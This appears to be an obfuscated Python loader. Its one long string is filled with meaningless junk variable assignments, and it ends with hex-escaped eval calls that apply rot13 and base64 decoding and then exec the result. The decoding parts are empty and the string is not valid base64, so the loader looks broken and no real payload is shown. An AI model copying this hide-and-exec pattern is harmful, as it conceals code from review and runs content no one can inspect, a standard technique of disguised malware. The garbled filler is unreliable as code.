import base64, codecs
magic = 'T16364814155879855356 = 521
IlllIIIllIllIIIIlIIlIIllIlIlllIIlllIIIIlIlIllIlllIlIlIlIIIlIlIllllIllIlllIIIIllIlIllIIllIllllIlIllIIllIIllIlIIIlllIlIllllIllIlllIlIIllIllIIlIIIllIIIlllIlIIIlIIlIIllIIlIIIIlIIlIllIIllIIlIIIlIllIllIIIIIIIlIlIIIlIlIlllIllIIllIlIIllllIlIllIIlIIIIlllIIlIlIIIIIllIIIIIlllIIIlIIIIlIIIIIlllIIIIlIlIllIIIlllllIIIIIlIllIllllIIlIIIllIllIIIIlIlIIIIllllIllIllllIIIlIl = "AGoAOrLUlLTfDbWnFwNbQieRjuYtgtJOSXNCPBBHUDOBaRiqBhfEEzdTYFOBCUrzDPZSvNuqYDVQvyS"
q1636481415587319352 = "opXtPuYJvQfqUyTsRjWzipVxkyQNCsAXiYIoVpxNwLuUIImQNhRgKcXOKvavEzODIWLHLgGyOoDrYSN"
TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT = "htHdjKOEEmhunkDMTOpCCStlqedpslIbIwXaQTAErHQIPwgCyZbdGoJWFRnTbqzYLowfHEzqxycxbWO"
rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr = 570
C1636481415586387346 = 218
AfSsicYCsMTgbNYpmRjUTFzdyFyFBoUQITJdeCVpbpLVaGmvtagMLxsKJYinVjZTpewqIfSKvUBXWOp344 = 416
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW = 241
lIIllIlIIIlIlIIIllIllIIllIllIlllIlIIlIllIIlllIIIlIIllIIIlIlIIllIIlIIlIlllIIlllIlIIIIIIllIllIIIlllIIllllIlllIlllIIlIIlIlIlIIIIIlIIllIllIllIIIIllIIlIIlIlllIlIIlIllIlIllllIllllIllllIIlIllIIllIllllllIlIIlIlIllIIllIIIlIlIIllIllIllllIIIllIIIIIllIIlIIlIllIIllIIlIIllIIIllIIlIlIlllIIIIlIllIllIIIllllIlIlIIllIlIllIIllIllllllIllllIIIlIIIllIlIIIlIIIII = "XlhtLzUXarMufbYbvRRMNfyJiGpoXSninAJGyeRIXqLURkHacZxlGASxXTVgplUEkWJVQjqvTqgbTGF"
sCIdRfEmWRQSLdrOWlZeGCTVeALGcuRTZfhUQQUObAJXKETiUWcIgxHPBAHLtwiHuMykEilllnDAEaK338 = "sTywgTfemKYjZGVyvTTZwvQfheJjhBCAXRqlDyACNenXjadTpKDDgWfRzrPeWydQjLJaZVDvoBRUSFT"
u336 = "dPtSRUZMhmMjOMRPrVCpQAMjqeMqelAUlhNZPNZyrOlEblLCChpfMIxNVgVjKWRKTFIxaKtDbKlZAOW"
IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII = 283
lIIIIlIIIIlIllIIllllllIlllIIIlllllIllIIlIlIllIlllIllllIIIlIlIIlllIIIIllIIIIIIIlllIIllIIlllIlIlIlIIlIIIlllIIllIllIlllIIIlllIIIllllIllllIlIIllIllIIIIIIIIIlIlIIllllIIllIllllIllIlIlIlllllIIIllIIllIIlIlIIIIIIIIIlIlIIlIlllIIIIlIlIlIIlIIlIIlIIIIlIlllIllllIlIlllIlIlIllIllIIIIIlIllIlllIIlIllllIlIIIIlIIIllIlllIIlIIllIIIlIlIllllIlIIIlIllIlIl = "iYJXkhcyQQKNvEWwlvsVtaAKnHXxmvXhORwZENjfPvYztrCTjcdFCrAgQqLjUfoXiGbvlMJzeFWmKlT"
eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee = "wybWCvjvPRinkcrGdmizTAyyiNSqUOdCLuAUBIOTgRAjPQbkfAFiOEPamgolxToqSWhZPTFDmzAawxQ"
C328 = 310
W326 = "lIBzMiKriQLoLTIVimEJqnUCdVBhOHpeeGDFTNkpsYRGwzHcHHKLyztaQOSpCJUXAHyJhMedYANhBNl"
AAaAaAaAaAaaAaaAAAaAAaaaAAAaAAaAAaAaaAAaaAAaAAaaaaaAAaAaAaAAaaaaAaaaaaaaaAAAaaaaaaaAAAAaaAaAAaaaaAaaaAAAAAAAaaaaAaaAAAaaaAaaAaaAAaAAaAAAaAAaAaaAAAaaAaaAaAaAAAaaAaAaaaaaAaaAAaaaAAaaAaaAaaaAaaaAAaAAaaaAAaaAaaAaAaAaAaaaaAaaAaaAAAaAAAaaaaAAAAaaaAAaaAaAAAaAAAAaaAAAaAaaAAAaaAaAaAaAAAAaaAAaAaAAAaaAAaaAaAAAAAAAaaAAAaaaAAAAaaAAaAaa = 298
aaAaaAAaaAaAaaaAAAaAAaaAaaaAaAAaAaAAaaAAAAaAaAAaAaAAAaAAaaAaaAAAAaaaAAaaAAaAaAaaaaAaaaAaAaaaaaaaaAAaAaaAAaaAaaaAAaaaaaAAaaaAaAaAaaAaAAaaAaAAAaAaaaAaaaaAAAaaaAAAAAAaaAAAaaAAaAAaAaAAaAAaaAaaaAaaaaaaaAaAAAaAAAAAAaAaaAaaaAAAaAaAAAAAaAAAAAaaAaaaAaAAAAAaaAaaAaAAaAAAAaaAAaAaAAaAAAaAAAaaAAAAAAAaAAAAaaAAAAAAAAAaaaaaaaAaaAAAaAAAAa = "kIfbLlGFOYKncwvwLFciKHNhQjsEZzzUhQGcYbmeWOdnfHmErSvAVMrJCSPnVKLPXctrFUWUadKIRxr"
FTHjbemyVrqVAGVAdNxYxaYhbkIdHPiYZWobKDDgzOBzxMeZJLTjRbKgoOrwpnpdsNXVJvBaADakecV320 = 308
h318 = 330
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS = 174
cbCOhNautnTepSlpQwLxuWiLSqiiTaqdCvXxhZqPXgkwpBUuKWjAghiJMudTbKVGjELASKweAMWSWEy314 = 355
r312 = 183
X16364814155822506310 = 56
AAaaAaAAAAAAaAAAaAAaaAaAaaAAAaAaaaAaaAAAaaaaAAAAAaaAaAaAaaaaAaaaAAaaaaaaAAaAaaAaaAAaAaAaaAAAAaAAAAAAAaAAAAAAAAAaaAaaAAaAAAAAaaaaaaaAaaAAAaAaaaAAaaaAAaaaaaAAaaaaAAAaAaAaAAAaAAaaAAaAaAAAAAaAaaAaaAaaaaaAaAaaaAAAaAAaAaaaAAAaaAaaAAaaAAaaAaAaAAAaaaAaAaaAaaAAAAaAAAaAAaaAaaaAaAAaaaAAaAaAaaaaaaaAaaAaaAaAaAAaaaaAAAaa = 578
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD = "vgaHPTYFiBaDYypKtzRyxDVtqEyGmompxXHryMGtVhOFJgCQTKjnMivCajrQyuTfljgTaklLztCAibU"
E16364814155814524304 = 624
Y1636481415581389302 = "BKUvDpUwfwCWfFbqmwAeIlkdaXfGWHzrIShtoxMkgQrrflwGcHeczesFVisPvwkBbDBliQiBRCrCdIG"
lllIIIIIlIIlIIIIIlIIlIlIlIIlIIlIllllllIIIlIIlIlIlIlllIlllIIlIllllIllllIlIlIlllIIlIIlIIlllIIlIlllIlIIIlllIlIlIIIllllIIIIlIIlIIlIIlIIlIIIlllIIIllIllIllIIIlIlIllIIllIIIllIlllIIIIIIIIIlIIlIIIIllllIIlllllIIIIIIIllIIlllIIlllIllllIIlIlIlIIlllIIlllIIllIIllllllIlllIlIlllIIlIIIIlIIIIllIlIIlllIlIIlllIlIIlIlIIl = 364
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ = "xLlIdATlhAfJyIsloByMxHoESfsXIUFnyGMudDLjaBWeoUnExoUZEJfIiAYWQimzlYCzThynAttyqJH"
OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO = "BWhLRSPQMUEutIiKPbhfmuTUJmJododWvNVQraDnkafydNQgiQMFCltBXdNhtxNYuUCGxlomylyAYmr"
AaAAaAaAAaAAaAAAaAaaAAAAAaAAaaaaaAaaAAAaaaaaaAAAAaaAaaaaAAaAaAAaaaaAAAAAaAAAAAaaAAAaaaAaaaaaaAAaAAAaaaaAAAaaaaAAAaaAAAAAAAAaaaAAaaAAaAaAaaAAaAaaAaaAaaaAAAaAAaaAAaAaaaAaaaaAaaAAaaaAAaAaAAAaaAaaaaaAaAaaAAAaaAAaaAaaAAAAaaaaAAAAaaaaAaaaaAaAAaaAAaaaaaaAaaaaaAAaAaaaaAAAAaaAAaaAaaAAAAAAaaaaAAaAaaaAaa = 329
iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii = "MTVXdGEdYnHTdkIBCGlbemWNvTpGQTOEpVdGtSYZXImMzKYfDCIjuEbMYQYooykNzBTEHYDfNedaauN"
L16364814155798326290 = "zsSZckbfFFzvbLoPpynRfVBOSWnjcCyDDoxHhjLBJgMAXFmvRCqXGpPatULtFJdVJBGIdKTzbyEpXrT"
eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee = 221
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy = 216
f16364814155791523284 = 170
WMSjbWsjsQcSrkTvwSgUngeetyxpRDWezZzIQHVjbdZokTfBREDLeoaFdqXKxUqPQvvlgpFUoNmFidm282 = "XdfMkiHMnNLBDPUEvmhhTuPUSLQyOzxjzwMqmexpJIKvEzelmrJCYqIhunEKtpkabgbyxuSKXAFFGLk"
AAaaaaAaaAAAaAAAAAAAaAaAAAAAaAaAaAAaAaAaAAAaaAAAAaaAAaAaAAAAAAAaaAaAaAaAAaAAaaaaAAaAAaaaaaaaAaAaAAAAaaaAaaaaAAAAaaaAAaAaaAAaAAAAAAAAaAaaaAaaAAaaaaAAAaAAAAaAaAaaAaaAaAAaAAaAAAAaAaAAaaAAAAaAAAaaAAaaAAaAAAaAAAaaAaaAaaAaAaaaAaAAaaAaaaAAaaAaAAAaaAaAAAaAaaaAaAAaaAaaAaaaaaaAaAaAaAAaAaaa = 246
aAAaAAaaaAaAaaAAAAaaAAaAaaAAaAaaAaaAAaAaaaAAAAAaaAAAaaaAaaaaAAaaAAAAaaAAaAaAAaAaaaAaaAAaaAAAAAAAAAaaaaaaAaAAAaAAAAaAAAAaaAAaAAAAaAaaaaAAaAaAaAaaaaaAAAAAaAaAAAAaaAaaAaAaAAAaAaAaAAaAAaAaAAaAAaaaAaAaAAaAAaaAaaAAaAAAAAAAAaaaAaAaAAAaaAaAaAAaaaaAaAaAaAAAAaAAaAAAaAAAAAAaAaaaAaaAAAaaaA = 484
cxKWOGupgxTBWoDghxbhNNPNDeCNrovftFgYIgisdgAOXgXYdKKhphKosHpZfiUAULmMXqJhvwlLdqn276 = 403
GSrFFWgSYjaxAtfSgBAZDfrSaEiAfPdGsYassebWeOwDPeibhxjQaUOGUkssSETBxyOKVTOfuWkSOHs274 = "hqGroXYHtIzykBCfzLdpwGcfCrBaZBRwxvSDgNoqHWFyWbpzDfobZrrzcMbkCmFaZFvAzBmKopyhFQc"
lIIIlIIIIlIIlIIlllIlIllIlllllllIIllIlIllIIlIllIIIIlIlllIlIIllIIllIlIllIIIlIlIlIlIlIllIIIIIlIlIlIIlIIIlIIlllIIlllllllIIlIlIlllllIlIIllIIlIIIllIIIIIIlIlllIIIlIlIIIIlIIIlIllIlIllIIIlIllIIlIlIllIIllIIllIlIlIIlIllIIIIlIIlIIlIllIIIIllIIllllIIllIIlIIlIlIIIIIllIlIIIllIIlIlIlllIII = "olifHpxdJPFrQebDkuUSGRaZfzTKoAKeBPNCjHylBZQlfzfoGlUmMjLhSVpAYUrXlMDBhEDRjcHNdEn"
x1636481415577389270 = "psMMpAXbFwewjlQALZEgUNBmLtUSlIdzgDyTMXdVUHigNbqkCjhgxVqcEclwMnpLRAHWhKWEFmBEVIL"
IlIllIIIIllIllIlllIlllllIIllIllIlllIIllIIlllIIIlIIIlIIlllIIllIllIlIlllIIlIlllIlIllIlllIlIllllIIIlIlIlIIIllIIIlIIIIIllllIlIllllIIIIIlIlllIIlllllllIlIlIIIllllIlIllIIlIlIllllIlIlllIIIlIIIlIIlllIIlIlIlIIlllIlIIIlIIlIIllIIlIIIIIIIIIlIlIIlllIlIIllIlIlllIlIllllIlIlllIllIIlII = 488
AaaaAaaAaAaAaaAaAAaAAAAAAaAaAAaAaaAaaaaAAaaaAaaAAaaAAAaAAaAAAaaaaaAAaAaAaaaaaAAaAaaAaaaaAaaaAaaaaAAaaaaAaaaaAaaAAAAaAAaaaaAAaaaaAAAAaaaaAAAaAaaaaAaAaaAaAaaaaaAAaaAAaaaaAaAAaAAAaAaaAAAaaAAAAAAAaaAaaAaaAAAaAaaAAaaAAAAAaAAAaaaaaAAaaaAaaAaaAaAAAaaAAaaaAAAAaaaaaAAaaAaAaA = "vLxOPaDyoyXFtLVafOBqxkfzqQazzaVPbvntxPjmLTYLHQKVmTjeAXhubclNTYrabQbbbrvmFXiJpIa"
U16364814155767777264 = 961
O16364814155765023262 = "QkXCBTftKcesspKsNQqpyNbvStUQVFMclbKnBpYTAKobqVbwSSaBkpXpvhNrlAnODyCamwaBecMajlJ"
aAAaaaaAaAAaaAaaaaAaaaaAaAaaaaaAAaaAaAaAAAAaaAAAAAAAAaAaaaAaAaAAaAAAAaAAAAaAaAAAaaaAaAAaAaaAAaaAaAaaaAAaAaAAAAaAaAAAAaaaaaAAAAAAAAAAAAaAAAaaAaAAAAAaAaaAAAaAaaAaaAaAAaaAaAAaAaaAAAAaAaaaAaAAaaAaaaAaaAaAaAaaaAAaAaaaaaaaaaAaaAAAAaaaaaaAaAaaAaAAaAaaAAAaAAaaAAAaaaaa = "GjFrvFjtGOdBLmaGXMtxcnZtLqbtmghTntEiGYunCuxoZnKtZPjjYuuHhUUEjdqrdInuYeKwmEXDgeR"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA = 706
Y16364814155758328256 = "hrdJZiIpRUUZXFzgYPzZWzFjvjfpEBGaRSkjKkopZIZWIvACUgZTmPFFSwWhaLwvMcwTFBAIkBGEgXu"
IIllIIlIIlIlIIlIIIllIlllllIlIIIIlllllIIIIlIlllllIIIIIIllIlIIIIIlllIIlIIlllIIlIlIIlIIIIllIIIIlIllIlllllIIlIIIllllllIIlIllllIllIIIIlllIIllIllIIlIlIlIIIlIlIlIlIlIllIIIllIlIIlIlllIlIllIIIIIIIlIIllIIllIlIllIIIIlllIlIIllllIIlIlIlIIlllIIIlIIlllllIllIlIIIIlIIIll = 312
iHkaWPKqdtyYbMoPYJRSGhmllhufpPcfCEbxNXlllhyYtASaiJNTfnMXjsNHcylehVRrnNcPCLOvcaD252 = "HgoJhNIWeUZZECnxtovjydgQnBzBgdhMNUtARlFNFMjYwsVfjXROIasiIyldZzpzDJqiSpApiWtTCQj"
Z16364814155749002250 = "WfvpFrfiuPakWdlAYFuvTxCimNfbJwXDJZcWHbFoUmrvNfemnJjmvVUdXswGXPLoXumIDBACmoCAhGS"
IlIIIlllIlllIllIIIlllIlIlllIIIllIlllllIlIlllIlllIIIIIllllIlllIllIIlIllIlllIIIllllllIIIlIIIIIIllIIIlIllIIllIIlIlIIlIlIIllllIIIlIllIIlIIllllIllIlllllIlllIIIIllIIlIIIllIIIIlllIlllIlllllIIllIIllIIIlIIIlIllllIIllIIlIIlIlllIIlIIIIIIIIlllIllIIIIllIlIllIlI = "gFOPgExpyOLYaiIbFmVrsOqYtVSCmbvtpBLpIahPJCHlCQEWnyMnTuPfgYdqlNVVWgrCETsjIbhEqyy"
D246 = 540
AaAAAAaAAAAaAAaAAaaaAAAAAAAAAAaaaAAAaaAAaaAaaAAAaaAAAaaAAaaaaaaaAaaAAaaaaaAAAaAAAaAaAaaaAAAAAaAAaAAAAAaaaaAaaaAAAAaAaAaaaaAaAaaaAaaaAaaaaaaaaaAAAAaAaAAaaAaaaAaAAAaAaaAAaAAaaaAaaAaAAAAAAaAaaAAaaAAaaaaAAAAaaaAaaAAaAaaaaaAAAaAAaaAAaAaAaAAaaaAaAaAa = 303
gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg = 510
jwiJdZDXNHMjZfznLZRTMZHIXeDxclHAcftVYvMujypgvdSCqanUhOqvdJpaPkbjyERWppNTGOOoVRI240 = 275
D16364814155736732238 = 626
q16364814155735106236 = 339
L234 = "lcEpUDivVqIQBOETNEiQQyAYNjxfgyIycznRfMVfmEsokRLbJjpQDaKxRwlnfcXoJJPYYTfYGnTEeAv"
BkPiDxSHYyBCGhCXxwKvLMVehFNqEuOFVprolrjVTvidglbYSZzHmaDfNupwMNQXiXlsOAlnjKQqNYr232 = 345
XYThNrLyAHryKyBiijYMtXcUTOlCglSrJPJZWKOMRGTCBNSDaXYyfuLMPhDJWPTIcmRZeEYQqOLhmTt230 = "wZGGknabgCulLvCdqBEMshnLlnKmNGXcoDwuohasWuqSFSjPSHBRyCnfCMjEBzgNngfwUzcknMFtBUA"
ANKObXiyAwZsnvuRKfErjDbzMeQPyNwlYxusJwUNAzTPlbvnKplkwzrFCgFZqLpULoaiSparyBhAmnE228 = "MAaIYvGoZNpZlluQnvYZHzkJlhbBfuvsmrfhSgAxYoJpWpKSqncdeLCNUpVkpnVfJVSGoezVFTgBrqK"
G16364814155726545226 = 125
Z1636481415572429224 = 546
cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc = "qyASZPzJXUptHbYKiHmIeeyWMMOfqyuoRZTQlmrHOCvNXRAULoPIuhyTBfMdgIHoGoPcWUfhJqejmhp"
IIIIllIllllIIIlllllIlIIllIlllIIIIlIllIIllIlIlIIIlIIIlIIllllIlIlllllIIlllllIIIlIIIlIllIIIllIllIIIlIIIIIIIlIlllIllIIlIlllllllIIIlIIlIIllIllIlIlIIlIIlllllIllIIIllIlIIlIIIllllIIlIlllllllIIlIIlllIIIIllllIIlIlllIlIlIIlIIllIlIl = "hOAKvbCshOXQCHRFAiHAbKjEJAkIxVdgTEOPCZGemMojDdjFpsHrfqzwoBVcrLGCIAiNnTMvomNSjiv"
IIlIIIIIIlIIlIIllIllllIlIlllIlIIIIIlIIIIllllIIIIIIIlIIIIIllIIIlIlIIIlllIIIIlllIllIIIlIIIllIIIlIlllIIlllllIlllllIllIllllllllllllllIlIIIllIlIIllIIIIlIllIIIlIlIIIIlIIlIIIIIlIlIIllIIllIlIIlllIllllIIllIIlIIIlIlIIIllIIIIIllI = 250
IllIIIIlIIlIlIIllIIIIlIlIlIIIlIlIllIllIllllIllIIllllIIllIlIIllIllIlllllIIlIllIllIllIlIIlIllllIIIIllIlIIIIlIllIlIIIIlllIIIlIIlIllIlllIIllllIIIlIIlIIlIIlIlllIIllIlllIIlllllIIIllIIIlIIlIIIlllIIIlllllIIlIIIIlIlIlllIIIIll = 307
h16364814155250897214 = "RhqjBumLccZrxFhuhhJSCNNKDQlJYcllygCrLBWTpupiojKhbEvaMYoqxOuGElzIGwpTyCtBDotRsEC"
aAaAAAaAaAAAaAaaaAaaAAaaaAaAaAAAaAAAaaAAAaaAaaaaaaAaAAAaAaAaAAaaAAaaaaaaAaaaaAAAaAaAaAaAAaAAAaaAAaaAaAaAAAaaAaAaaaAaAAaaAaaAAaaAAaaAaAAaaaAaAAAaaAaAaaAaaAAaAAAaaAAAaaaaaaAAaaaAaaAaaAaaAAaAaaAaaaaaaAAAaAAAaAAAAaAA = "JEREesQEGSNkjUkmiYDslNGHDPaNiZJACDIzGlShDHXhZFsDJCbGlHdrxZCYoAPWiCpxEcLREKgVcpx"
vFoaQORVyyCvzbcoiZevEeiQUvAAksmmobkiIraxQCqsNgosONCJcOJTJfDBJgZAVLfRXEnaGRNGNrO210 = "FtkzNBwAQaWCDtfBrnYfIkxYabzJWqwLxAXOTTvlHjwesirUpgpFJhHdBioCFDBYTMpIbVLkSmrwXBg"
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk = 650
llIlIlIIIlllIIIIlIlllIIllIIIllIIlIlllIlIlIIllIlIlIlIIIIIlIIIIlIlIlIlllllIlIIllIlllllIlIIIIlIlIllllIlllIlIIlIIIlIlIIlllllllIllIIlIIIIlIlIlIIllllIIIlIlIIlIlIIlIIIlIlIlIlIIIIlIIIIIIIllIlllllIllIllIIIlIlllllIll = 91
M16364814155241394204 = "SjwckVavOcrfcBsaBsqahZZtPNIarwStfHjJOvPpXVcpHauBPABgLexYtoSBEdmjNwDXHADHUBuszhQ"
dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd = 557
IllllIIIIllIllllIIllllIlIlIIlIIlIlllllIllIlIlllIIIIllIIlllllIlIlIlIIIIIlIIIlIIIIIlllllIlIlIlIIlIIlIlIllIlIlIlIIlIlIIlIIIIlIllIlllIlIllllllllIIlIIlllIIIIIlIIlIIlIIlIIlIlIllllllIIlIllIIIIIllllllIIlIllIl = 219
AaAaaaaAAAAAAaaaaaAAAaAAaaaaAaAaaaaAAAAAAaaaAAaAaaaAAAaAaaaaaaAaaAAaAAaaaAaAa'
love = ''
god = ''
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
